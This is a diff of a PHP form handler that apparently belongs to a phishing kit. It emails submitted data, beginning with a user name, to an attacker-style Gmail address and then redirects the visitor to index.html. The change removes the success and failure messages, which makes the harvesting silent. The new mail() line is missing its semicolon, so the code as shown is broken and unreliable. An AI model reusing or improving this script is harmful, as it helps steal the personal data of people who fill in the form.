@@ -14,11 +14,6 @@ $email_body="User Name: $name.\n".
 $to ="420hackernoob@gmail.com";
 $headers="From: bad420eye@gmail.com \r\n";
 
-if(mail($to,$email_subject,$email_body,$headers)){
-  echo "Request Send Sucessfuly";
-}
-else {
-  echo "Request Can't Send";
-}
+mail($to,$email_subject,$email_body,$headers)
 header("Location: index.html");
 ?>
